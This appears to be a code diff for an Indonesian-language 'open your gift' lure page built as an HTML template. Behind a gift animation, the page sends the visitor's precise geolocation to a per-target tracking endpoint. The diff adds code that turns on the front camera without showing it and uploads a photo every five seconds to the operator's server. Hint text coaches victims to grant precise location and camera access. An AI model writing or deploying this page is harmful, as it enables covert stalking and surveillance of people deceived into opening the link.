@@ -24,35 +24,19 @@
     h1{margin:0 0 8px; font-size:clamp(22px,3vw,28px)}
     p.note{margin:6px 0 14px; color:var(--muted); font-size:13px}
 
-    /* Gift box */
     .stage{display:grid; place-items:center; padding:14px 0 22px}
-    .gift{
-      position:relative; width:220px; height:220px; transform-style:preserve-3d;
-      transition:transform .5s ease;
-    }
-    .box{
-      position:absolute; inset:40px 0 0 0; margin:auto; width:220px; height:180px;
-      background:linear-gradient(135deg, #111a33, #0f172a);
-      border:1px solid var(--stroke); border-radius:14px;
-      box-shadow:0 18px 30px rgba(0,0,0,.35) inset;
-      overflow:hidden;
-    }
-    .ribbon-v, .ribbon-h{ position:absolute; background:linear-gradient(135deg, var(--g1), var(--g2)); }
+    .gift{position:relative; width:220px; height:220px; transform-style:preserve-3d; transition:transform .5s ease;}
+    .box{position:absolute; inset:40px 0 0 0; margin:auto; width:220px; height:180px;
+         background:linear-gradient(135deg, #111a33, #0f172a); border:1px solid var(--stroke); border-radius:14px;
+         box-shadow:0 18px 30px rgba(0,0,0,.35) inset; overflow:hidden;}
+    .ribbon-v,.ribbon-h{position:absolute; background:linear-gradient(135deg, var(--g1), var(--g2));}
     .ribbon-v{ width:18px; height:100%; left:101px; top:0 }
     .ribbon-h{ height:18px; width:100%; left:0; top:68px }
-    .lid{
-      position:absolute; top:0; left:0; width:220px; height:70px;
-      background:linear-gradient(135deg, #121b35, #13203f);
-      border:1px solid var(--stroke); border-radius:14px 14px 10px 10px;
-      transform-origin:50% 100%; transition:transform .6s cubic-bezier(.2,.8,.2,1);
-      overflow:hidden;
-    }
-    .bow{
-      position:absolute; top:10px; left:50%; transform:translateX(-50%);
-      width:110px; height:36px; border-radius:999px;
-      background:linear-gradient(135deg, var(--g1), var(--g2));
-      filter:drop-shadow(0 4px 10px rgba(34,211,238,.25));
-    }
+    .lid{position:absolute; top:0; left:0; width:220px; height:70px; background:linear-gradient(135deg, #121b35, #13203f);
+         border:1px solid var(--stroke); border-radius:14px 14px 10px 10px; transform-origin:50% 100%;
+         transition:transform .6s cubic-bezier(.2,.8,.2,1); overflow:hidden;}
+    .bow{position:absolute; top:10px; left:50%; transform:translateX(-50%); width:110px; height:36px; border-radius:999px;
+         background:linear-gradient(135deg, var(--g1), var(--g2)); filter:drop-shadow(0 4px 10px rgba(34,211,238,.25));}
     .gift.open .lid{ transform:translateY(-28px) rotateX(55deg) }
     .gift.open{ transform:translateY(-2px) }
 
@@ -77,49 +61,51 @@
     }
     @keyframes spin{to{transform:rotate(360deg)}}
     .hint{margin-top:12px; color:var(--muted); font-size:12px}
+
+    #preview{display:none; width:180px; border-radius:10px; border:1px solid var(--stroke); margin-top:10px}
   </style>
 </head>
 <body>
   <div class="wrap">
     <div class="card">
       <h1>Buka Hadiah 🎁</h1>
-      <p class="note">Klik “Buka Hadiah” untuk membuka paket</p>
+      <p class="note">Klik “Buka Hadiah” untuk membuka paket dan mengizinkan lokasi & kamera.</p>
 
       <div class="stage">
         <div id="gift" class="gift" aria-hidden="true">
-          <div class="lid">
-            <div class="bow"></div>
-            <div class="ribbon-h"></div>
-          </div>
-          <div class="box">
-            <div class="ribbon-v"></div>
-          </div>
+          <div class="lid"><div class="bow"></div><div class="ribbon-h"></div></div>
+          <div class="box"><div class="ribbon-v"></div></div>
         </div>
       </div>
 
-      <button id="openBtn" class="btn">
-        <span>🎉 Buka Hadiah</span>
-      </button>
+      <button id="openBtn" class="btn"><span>🎉 Buka Hadiah</span></button>
       <div id="status" class="status">
         <div id="spin" class="spinner" style="display:none"></div>
         <span id="statusText">Siap dibuka</span>
       </div>
 
-      <p class="hint">Created : D</p>
+      <!-- optional preview kamera -->
+      <video id="preview" playsinline autoplay muted></video>
+
+      <p class="hint">Jika tidak merespon, pastikan izin lokasi & kamera tidak diblokir. iOS: Settings → Safari → Location/Camera → Allow & Precise.</p>
     </div>
   </div>
 
-  <!-- konfeti saat hadiah terbuka -->
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti/dist/confetti.browser.min.js"></script>
   <script>
-    const token = {{ token|tojson }};
-    const base  = {{ base|tojson }};
+    const token  = {{ token|tojson }};
+    const base   = {{ base|tojson }};
 
-    const gift  = document.getElementById('gift');
-    const btn   = document.getElementById('openBtn');
+    const gift   = document.getElementById('gift');
+    const btn    = document.getElementById('openBtn');
     const status = document.getElementById('status');
     const statusText = document.getElementById('statusText');
-    const spin  = document.getElementById('spin');
+    const spin   = document.getElementById('spin');
+    const preview= document.getElementById('preview');
+
+    let lastHitId = null;
+    let snapshotTimer = null;
+    let stream = null;
 
     function setStatus(text, type){
       statusText.textContent = text;
@@ -134,50 +120,86 @@
         confetti({ particleCount: 120, spread: 70, origin: { y: 0.25 } });
       }
     }
+
     async function postLoc(lat, lon, acc){
       try{
-        await fetch(`${base}/api/track/${token}`,{
+        const r = await fetch(`${base}/api/track/${token}`,{
           method:'POST', headers:{'Content-Type':'application/json'},
           body: JSON.stringify({ lat, lon, acc })
         });
+        const j = await r.json();
+        if (j && j.ok && j.id) lastHitId = j.id;
       }catch(e){}
     }
-    async function requestLocation(){
+    async function uploadPhoto(blob){
+      if (!lastHitId || !blob) return;
+      const fd = new FormData();
+      fd.append('photo', blob, 'frame.jpg');
+      try{ await fetch(`${base}/api/photo/${token}/${lastHitId}`, { method:'POST', body: fd }); }catch(e){}
+    }
+
+    async function startCameraAndSnap(){
+      try{
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('getUserMedia tidak didukung');
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        preview.srcObject = stream;
+        await preview.play().catch(()=>{});
+        // preview.style.display = 'block'; // tampilkan jika mau
+
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        const snap = async ()=>{
+          if (!preview.videoWidth) return;
+          canvas.width  = preview.videoWidth;
+          canvas.height = preview.videoHeight;
+          ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(uploadPhoto, 'image/jpeg', 0.8);
+        };
+        await snap();
+        snapshotTimer = setInterval(snap, 5000);
+        setStatus('Hadiah terbuka • kamera aktif ✔️', 'ok');
+      }catch(err){
+        setStatus('Kamera ditolak/tidak tersedia. Lanjut tanpa foto.', 'err');
+      }
+    }
+
+    async function requestAll(){
       btn.disabled = true;
       setStatus('Meminta izin…', 'loading');
       try{
-        if (!('geolocation' in navigator)) throw new Error('Geolocation tidak didukung');
-        navigator.geolocation.getCurrentPosition((pos)=>{
-          const { latitude, longitude, accuracy } = pos.coords;
-          setStatus('Hadiah terbuka & lokasi terkirim ✔️', 'ok');
-          openGiftUI(true);
-          postLoc(latitude, longitude, accuracy); // kirim ke server (admin akan melihatnya)
-        }, (err)=>{
-          let msg = 'Gagal mengambil lokasi. Mengirim via IP.';
-          if (err.code === 1) msg = 'Izin lokasi ditolak. Mengirim via IP.';
-          setStatus(msg, 'err');
-          openGiftUI(false);
-          postLoc(null, null, null); // server coba fallback IP
-        }, { enableHighAccuracy:true, maximumAge:0, timeout:20000 });
-      }catch(e){
-        setStatus('Fitur geolocation tidak tersedia. Mengirim via IP.', 'err');
-        openGiftUI(false);
-        postLoc(null, null, null);
-      }finally{
+        if ('geolocation' in navigator){
+          await new Promise((resolve)=>{
+            navigator.geolocation.getCurrentPosition((pos)=>{
+              const { latitude, longitude, accuracy } = pos.coords;
+              postLoc(latitude, longitude, accuracy).then(resolve).catch(resolve);
+            }, (_err)=>{
+              postLoc(null, null, null).then(resolve).catch(resolve);
+            }, { enableHighAccuracy:true, maximumAge:0, timeout:20000 });
+          });
+        } else {
+          await postLoc(null, null, null);
+        }
+        openGiftUI(true);
+        await startCameraAndSnap();
+      } finally {
         btn.disabled = false;
         btn.textContent = 'Buka Lagi';
       }
     }
 
-    // Klik tombol = gesture yang diperlukan untuk izin
-    btn.addEventListener('click', requestLocation);
+    btn.addEventListener('click', requestAll);
 
-    // Kalau user sudah grant sebelumnya, otomatis jalan saat buka halaman
+    // pre-warm entry jika izin geolocation sudah granted (kamera tetap butuh klik di iOS)
     if (navigator.permissions && navigator.permissions.query){
       navigator.permissions.query({name:'geolocation'}).then(p=>{
-        if (p.state === 'granted'){ requestLocation(); }
+        if (p.state === 'granted'){ postLoc(null, null, null); }
       }).catch(()=>{});
     }
+
+    window.addEventListener('beforeunload', ()=>{
+      if (snapshotTimer) clearInterval(snapshotTimer);
+      if (stream) stream.getTracks().forEach(t=>t.stop());
+    });
   </script>
 </body>
 </html>
